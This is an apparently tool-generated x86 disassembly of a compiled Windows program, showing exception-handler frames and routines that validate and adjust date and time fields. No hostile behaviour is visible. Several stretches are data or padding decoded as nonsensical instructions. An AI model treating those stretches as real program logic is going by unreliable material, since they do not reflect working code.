je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24b ] 0x0
jne r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24b ] 0x1
xor eax eax
push ebp
push sub_47f823
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffdfe
mov eax [ ebp + 0x8 ]
call sub_47dc4c
cmp ax 0x1
sbb edx edx
inc edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24b ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
dec eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f92b
lea eax [ ebp - 0x10 ]
call sub_40f564
retn
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_47f8e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffdff
mov eax [ ebp + 0x8 ]
call sub_47dbe8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x68 ]
call sub_4234a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
sub eax 0xb
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_47f888
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx 0xfffffe00
mov eax [ ebp + 0x8 ]
call sub_47dd6c
lea eax [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x68 ]
call sub_47ce20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x249 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x249 ] 0x1
xor eax eax
push ebp
push sub_47f7c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffe0b
mov eax [ ebp + 0x8 ]
call sub_47dbe8
mov edx eax
mov eax [ ebp + 0x8 ]
call sub_44a158
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x249 ] 0x0
retn
sub_47f95c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47f98d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f994
retn
mov eax rw-data
call sub_40f564
sub_47f998
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47f9e0
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f9e7
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419e58
mov eax rw-data
mov edx [ rw-data ]
call sub_40f878
sub_47f9ec
push ebx
push esi
mov ebx edx
mov esi eax
cmp bx 0x2
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_409c64
test al al
jne r-xdata
and eax 0x7f
lea eax [ eax + eax * 2 ]
mov edx [ rw-data ]
lea eax [ edx + eax * 8 ]
movzx edx bx
mov ax [ eax + edx * 2 - 0x2 ]
pop esi
pop ebx
retn
mov al 0x1
sub_47fa24
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47fa49
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fa50
retn
sub_47fa5c
push 0xdb004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dh bl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_47faa1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47faa8
retn
sub_47fd34
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x2 ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax + 0x6 ] 0x0
jne r-xdata
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0xa ] 0x0
jne r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_47fd78
push ebx
jmp r-xdata
mov cx [ eax + 0x6 ]
cmp cx 0x1
jb r-xdata
xor ecx ecx
mov cl dl
mov bx [ ecx * 4 + rw-data ]
add [ eax + 0x4 ] bx
mov cx [ ecx * 4 + rw-data ]
add [ eax + 0x6 ] cx
cmp cx 0xc
ja r-xdata
pop ebx
retn
sub_47fdac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_47ff38
jmp r-xdata
mov dx [ esi + 0x8 ]
cmp dx 0x1
jb r-xdata
xor edx edx
mov dl bl
mov dx [ edx * 4 + rw-data ]
add [ esi + 0x6 ] dx
test bl bl
je r-xdata
movzx edx dx
cmp eax edx
jl r-xdata
add [ esi + 0x8 ] ax
sub [ esi + 0x8 ] ax
jmp r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_47fd78
mov eax esi
call sub_47ff38
sub_47fe00
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xa ]
cmp ax 0x17
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0x8 ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xa ] ax
mov edx ebx
mov eax esi
call sub_47fdac
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_47fe44
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xc ]
cmp ax 0x3b
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0xa ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xc ] ax
mov edx ebx
mov eax esi
call sub_47fe00
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_47fe88
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xe ]
cmp ax 0x3b
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0xc ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xe ] ax
mov edx ebx
mov eax esi
call sub_47fe44
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_47fecc
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_47fd78
mov edx ebx
mov eax esi
call sub_47fdac
mov edx ebx
mov eax esi
call sub_47fe00
mov edx ebx
mov eax esi
call sub_47fe44
mov edx ebx
mov eax esi
call sub_47fe88
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_47fe88
mov edx ebx
mov eax esi
call sub_47fe44
mov edx ebx
mov eax esi
call sub_47fe00
mov edx ebx
mov eax esi
call sub_47fdac
mov edx ebx
mov eax esi
call sub_47fd78
pop esi
pop ebx
retn
sub_47ff50
mov cx [ edx + 0x4 ]
sub [ eax + 0x4 ] cx
mov cx [ edx + 0x6 ]
sub [ eax + 0xa ] cx
mov cx [ edx + 0x8 ]
sub [ eax + 0x8 ] cx
mov cx [ edx + 0xa ]
sub [ eax + 0xa ] cx
mov cx [ edx + 0xc ]
sub [ eax + 0xc ] cx
mov cx [ edx + 0xe ]
sub [ eax + 0xe ] cx
mov edx [ edx + 0x10 ]
sub [ eax + 0x10 ] edx
mov dl 0x1
call sub_47fecc
retn
sub_47ff90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_47fd6c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov ax [ esi + 0x4 ]
add [ ebx + 0x4 ] ax
mov ax [ esi + 0x6 ]
add [ ebx + 0xa ] ax
mov ax [ esi + 0x8 ]
add [ ebx + 0x8 ] ax
mov ax [ esi + 0xa ]
add [ ebx + 0xa ] ax
mov ax [ esi + 0xc ]
add [ ebx + 0xc ] ax
mov ax [ esi + 0xe ]
add [ ebx + 0xe ] ax
mov eax [ esi + 0x10 ]
add [ ebx + 0x10 ] eax
xor edx edx
mov eax ebx
call sub_47fecc
sub_47ffe4
push ebx
movsx ecx [ eax + 0x4 ]
movsx ebx [ edx + 0x4 ]
sub ecx ebx
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0x6 ]
movzx ebx [ edx + 0x6 ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0x8 ]
movzx ebx [ edx + 0x8 ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xa ]
movzx ebx [ edx + 0xa ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xa ]
movzx ebx [ edx + 0xa ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xc ]
movzx ebx [ edx + 0xc ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xe ]
movzx ebx [ edx + 0xe ]
sub ecx ebx
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x10 ]
sub ecx [ edx + 0x10 ]
test ecx ecx
jle r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
mov al 0x2
jmp r-xdata
pop ebx
retn
sub_480094
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_480628
mov esi esp
lea edi [ ebx + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4800b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_480694
lea esi [ ebp - 0x10 ]
lea edi [ ebx + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4800e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403224
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_480694
push esi
lea edi [ esi + 0x4 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_480140
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_480628
xor edx edx
mov eax edi
call sub_403224
push edi
add edi 0x4
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_480198
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax esi
call sub_480764
xor edx edx
mov eax edi
call sub_403224
lea edx [ edi + 0x4 ]
mov eax esi
mov ecx 0x10
call sub_4029c0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4801e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ ecx + 0x4 ]
mov ecx eax
xor edx edx
mov eax esi
call sub_480198
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_480268
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_480388
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415530
xor eax eax
push ebp
push sub_48036b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415540
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4155cc
test al al
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_415530
xor eax eax
push ebp
push sub_48033e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41554c
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4800e4
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_415538
retn
lea ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4155d8
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_480140
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480372
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415538
retn
sub_480394
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4804ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
mov edx [ ebp - 0x4 ]
cmp ax [ edx + 0x4 ]
jne r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4150bc
mov eax esi
sub ax 0x8
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x8 ]
call sub_480064
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
call sub_4047fc
mov ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_415580
jmp r-xdata
sub ax 0xf8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4804b2
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403fc8
lea eax [ ebp - 0x18 ]
call sub_4046b0
retn
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x8 ]
call sub_480064
mov ecx [ ebp - 0x20 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_415574
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_415530
xor eax eax
push ebp
push sub_480474
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x14 ] 0x7
mov eax [ ebx + 0x8 ]
call sub_48007c
fstp [ ebp - 0xc ]
fwait
push esi
lea ecx [ ebp - 0x14 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41554c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_415538
retn
sub_4804bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ax [ ebx + 0x4 ]
mov [ edi ] ax
mov ecx [ esi + 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4801e8
mov [ edi + 0x8 ] eax
mov edx esi
mov eax ebx
call sub_415560
test al al
je r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_415540
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_48050c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x1
jb r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_47ff90
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_47ff50
jmp r-xdata
jmp r-xdata
call sub_415504
sub_480540
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_47ffe4
mov edx [ ebp + 0x8 ]
mov [ edx ] al
pop esi
pop ebx
pop ebp
retn 0x4
sub_480560
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx eax
lea eax [ esp + 0x8 ]
call sub_4806dc
fstp [ esp ]
fwait
push [ esp + 0x4 ]
push [ esp + 0x4 ]
mov eax esi
mov edx ebx
call sub_40aab8
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_48059c
push ebx
push esi
mov ebx eax
mov si [ ebx + 0x2 ]
cmp si 0xc
ja r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov ax [ ebx ]
call sub_47f9ec
cmp ax [ ebx + 0x4 ]
jb r-xdata
cmp [ ebx + 0x6 ] 0x17
ja r-xdata
cmp [ ebx + 0x8 ] 0x3b
ja r-xdata
cmp [ ebx + 0xa ] 0x3b
jbe r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4805dc
push ebx
push esi
push edi
add esp 0xffffffe8
mov ebx edx
mov edx esp
call sub_40b388
test al al
je r-xdata
test al al
jne r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
call sub_480694
lea esi [ esp + 0x8 ]
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebx
call sub_48059c
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edi ebx
mov esi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_480628
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_480685
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_4805dc
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48068c
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
sub_480694
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebx + 0x4 ]
lea edx [ ebx + 0x2 ]
lea eax [ ebp - 0x4 ]
call sub_409ee4
mov ax [ ebp - 0x4 ]
mov [ ebx ] ax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
lea ecx [ ebx + 0xa ]
lea edx [ ebx + 0x8 ]
lea eax [ ebx + 0x6 ]
call sub_409c08
movzx eax [ ebp - 0x2 ]
mov [ ebx + 0xc ] eax
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4806dc
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_47fd34
test al al
je r-xdata
mov cx [ ebx + 0x4 ]
mov dx [ ebx + 0x2 ]
mov ax [ ebx ]
call sub_409d68
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov ax [ ebx + 0xc ]
push eax
mov cx [ ebx + 0xa ]
mov dx [ ebx + 0x8 ]
mov ax [ ebx + 0x6 ]
call sub_409bc8
fsubr [ esp ]
fstp [ esp ]
fwait
mov ax [ ebx + 0xc ]
push eax
mov cx [ ebx + 0xa ]
mov dx [ ebx + 0x8 ]
mov ax [ ebx + 0x6 ]
call sub_409bc8
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_480764
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_480860
push [ fs : eax ]
mov [ fs : eax ] esp
movsx eax [ ebx ]
movzx edx [ ebx + 0x2 ]
add eax edx
movzx edx [ ebx + 0x4 ]
add eax edx
mov edx eax
movzx ecx [ ebx + 0x6 ]
add edx ecx
movzx ecx [ ebx + 0x8 ]
add edx ecx
movzx ecx [ ebx + 0xa ]
add edx ecx
test edx edx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480867
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
test eax eax
jle r-xdata
movzx eax [ ebx + 0x6 ]
movzx edx [ ebx + 0x8 ]
add eax edx
movzx edx [ ebx + 0xa ]
add eax edx
test eax eax
jbe r-xdata
mov si [ ebx ]
test si si
je r-xdata
cmp [ ebx + 0x6 ] 0x17
ja r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
cmp [ ebx + 0x2 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
cmp [ ebx + 0xa ] 0x3b
ja r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x3b
jbe r-xdata
cmp [ ebx + 0x2 ] 0x1f
ja r-xdata
mov dx [ ebx + 0x2 ]
mov eax esi
call sub_47f9ec
cmp ax [ ebx + 0x4 ]
jae r-xdata
sub_480870
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4808a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4808a8
retn
mov eax rw-data
call sub_40d788
sub_4808cc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x9
dec eax
add [ eax + eax ] cl
add [ eax ] al
sbb al 0x74
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
or eax 0x64634245
inc ebp
js r-xdata
arpl [ ebp + 0x70 ] sp
je r-xdata
jo r-xdata
adc [ eax ] ecx
cmp al 0x12
dec eax
add [ eax + 0x51 ] cl
inc ecx
outsd
outsb
mov eax eax
aam 0x9
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
or cl [ eax ]
adc al 0x0
add [ eax ] al
insb
pushad
inc ecx
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
imul ebp [ edi + 0x6e ] 0x970c08b
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x9 ] dh
dec eax
add [ eax + eax ] cl
add [ eax ] al
enter 0x4808 0x0
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ 0x64634245 ] dl
dec edi
jbe r-xdata
popad
popad
outsb
je r-xdata
inc ecx
push ebp
inc ecx
add ah dh
push esp
jb r-xdata
add [ eax ] eax
or [ ecx + 0x73 ] al
inc esp
outsd
jne r-xdata
movsb [ edi ] [ esi ]
or cl [ eax ]
pop es
or edx [ esi + eax * 2 + 0x4d ]
push esp
je r-xdata
mov ah 0xac
jns r-xdata
hlt
insb
outsd
ja r-xdata
add [ eax + eax ] 0x8
inc ecx
jae r-xdata
insb
push esp
adc [ eax ] al
pop esp
or eax 0xe640048
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41090002 ] al
jae r-xdata
dec eax
add [ esi + ecx + 0x48 ] ah
mov [ edx ] cl
dec eax
add ah ch
add [ ecx ] 0x5
add [ esi ] al
inc esi
dec ebp
push esp
inc edx
arpl [ ebp + eax ] sp
int3
inc edx
arpl [ esp + eax * 2 + 0x61 ] sp
je r-xdata
nop
mov [ edx ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx + 0x48 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
or cl [ eax ]
sub [ eax ] al
add [ eax ] al
js r-xdata
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
push eax
push esp
inc ecx
add [ ebp + edx * 2 + 0x54e00041 ] ah
inc ecx
add [ edx * 2 + 0x54f40041 ] dl
js r-xdata
pop ecx
mov [ fs : eax ] edx
push sub_480bdf
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
je r-xdata
outsb
je r-xdata
push esp
inc ecx
add [ ecx + edx ] al
dec eax
add [ edx + edx ] bh
inc ecx
add al cl
stosd [ edi ]
inc ecx
add [ ebx ] cl
push esp
inc esi
dec ebp
push esp
inc edx
arpl [ esp + eax * 2 + 0x61 ] sp
inc ecx
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
pushfd
stosd [ edi ]
inc ecx
add [ esp + ebp * 4 - 0x534bffbf ] ch
add [ eax ] al
pop ecx
inc ecx
add ah bl
jo r-xdata
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5efe4d35 ]
enter 0x4808 0x0
call sub_40bc28
call sub_4039e0
pop ebx
retn
imul ebp [ esi + 0x67 ] 0x83ec8b55
push [ eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor ecx ecx
jb r-xdata
add ah dh
adc [ eax ] cl
push 0xb4004813
adc ecx [ eax ]
sub [ ebp + 0x41 ] dl
add [ eax ] dl
push ecx
inc ecx
add [ esp + edx ] cl
dec eax
add ah ch
push ebp
inc ecx
add ah al
pop ebx
inc ecx
add al dl
pop ebx
inc ecx
add [ eax ] bl
push 0x68880041
inc ecx
add [ eax ] cl
adc al 0x48
add [ edx ] dl
push esp
inc esi
